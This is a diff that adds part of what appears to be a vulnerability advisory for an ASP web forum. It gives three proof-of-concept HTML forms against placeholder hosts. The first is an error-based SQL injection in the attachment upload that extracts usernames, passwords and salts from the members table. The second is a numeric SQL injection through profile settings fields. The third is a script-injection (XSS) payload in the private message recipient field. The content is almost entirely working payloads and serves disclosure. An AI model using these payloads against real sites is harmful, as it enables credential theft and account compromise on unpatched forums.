@@ -1,0 +1,39 @@
+3.1. &quot;/forums/attach-file.asp&quot; SQL Inection POC:
+     -------------
+        &lt;form ENCTYPE=&quot;multipart/form-data&quot; method=&quot;post&quot; action=&quot;http://www.example.com/forums/attach-file.asp?action=postupload&amp;amp;mid=[YOUR MSG ID]&amp;amp;attachmentid=1 or 1=convert(int,(select top 1 username%2bpassword%2bsalt from members where username&lt;&gt;&#039;&#039;))&quot;&gt;
+        File : &lt;input type=&#039;file&#039; name=&#039;attachment&#039; size=&#039;40&#039;&gt;
+        &lt;br /&gt;
+        &lt;input type=&#039;submit&#039; value=&#039;Submit&#039;&gt;
+        &lt;/form&gt;
+    -------------
+    3.2. &quot;/profile/controlpanel.asp&quot; SQL Injection POC:
+    -------------
+        &lt;form method=&#039;post&#039; name=&#039;updateprofile&#039; action=&#039;http://www.example.com/profile/controlpanel.asp&#039;&gt;
+        Injection1 (Numeric Update):&lt;input type=&quot;text&quot; name=&quot;invisible&quot; value=&quot;1&quot; /&gt;
+        &lt;br /&gt;
+        Injection2 (Numeric Update):&lt;input type=&quot;text&quot; name=&quot;timeoffset&quot; value=&quot;1&quot; /&gt;
+        &lt;br /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;updateinfo&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;showemail&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;usesignature&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;viewsignature&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;disablepostcount&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;userichedit&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;emailnotifications&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;sendprivatenotifications&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;includebody&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;language&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;disallowbroadcasts&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;viewavatars&quot; value=&quot;1&quot; /&gt;
+        &lt;input type=&quot;submit&quot; /&gt;
+        &lt;/form&gt;
+    -------------
+    3.3. &quot;send-private-message.asp&quot; XSS POC:
+    -------------
+        &lt;form action=&quot;http://www.example.com/send-private-message.asp&quot; method=&quot;post&quot;&gt;
+        &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;post&quot; /&gt;
+        &lt;input type=&quot;text&quot; name=&quot;toid&quot; value=&quot;&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;&quot; /&gt;
+        &lt;br /&gt;
+        &lt;input type=&quot;submit&quot; name=&quot;&quot; value=&quot;submit&quot; /&gt;
+        &lt;/form&gt;
+    -------------
